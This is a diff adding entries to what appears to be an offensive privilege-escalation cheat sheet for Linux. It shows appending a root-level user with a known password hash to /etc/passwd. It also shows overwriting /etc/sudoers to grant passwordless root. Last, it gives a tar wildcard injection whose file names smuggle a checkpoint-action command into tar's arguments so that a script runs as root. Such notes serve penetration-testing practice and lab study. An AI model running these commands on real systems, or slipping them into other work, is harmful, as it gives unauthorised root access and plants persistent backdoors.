@@ -116,6 +116,16 @@ openssl passwd w00t    #Create a password -> $1$rPTJ2Aqi$ZJSECPu2I/HdZsHrui68k.
 echo 'root2:$1$rPTJ2Aqi$ZJSECPu2I/HdZsHrui68k.:0:0:root:/root:/bin/bash' >> /etc/passwd    #Create new user in passwd file using created password
 su root2      #Elevate Privs with su
 
+#Updating Sudoers
+echo 'kali ALL=(root) NOPASSWD: ALL' > /etc/sudoers
+
+#Tar wildcard 
+Step 1: Create the two files in the folder tar will execute
+echo "" > '--checkpoint=1'
+echo "" > '--checkpoint-action=exec=sh privesc.sh'
+Step 2: In the same location create a file called privesc.sh containing the below changing user as necessary 
+echo 'kali ALL=(root) NOPASSWD: ALL' > /etc/sudoers
+Step 3: Use sudo to escalate privs
 
 #Overwriting SSH id_rsa/authorized keys
 #ssh-keygen -t rsa             #Create SSH RSA key pair
